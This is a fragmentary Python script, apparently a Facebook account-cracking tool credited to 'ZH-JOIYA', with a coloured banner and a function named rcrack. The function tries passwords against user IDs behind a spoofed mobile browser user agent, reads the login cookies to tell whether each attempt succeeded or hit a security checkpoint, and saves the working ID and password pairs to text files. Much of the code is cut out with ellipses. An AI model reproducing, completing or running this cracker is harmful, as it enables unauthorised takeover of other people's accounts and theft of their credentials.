...
\033[1;33m----------------------------------------------
 ...
 \033[1;35mGITHUB    : \033[1;35mZH-JOIYA
...
def rcrack(uid,pwx,tl):
    ...
    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5,'
            ...
            if 'c_user' in log_cookies:
                ...
                open('ZHJOIYA-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                print('\033[1;31m[SOMI-JOIYA-CP] '+uid+' | '+ps+'\x1b[1;97m')
                open('SOMI-JOIYA-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
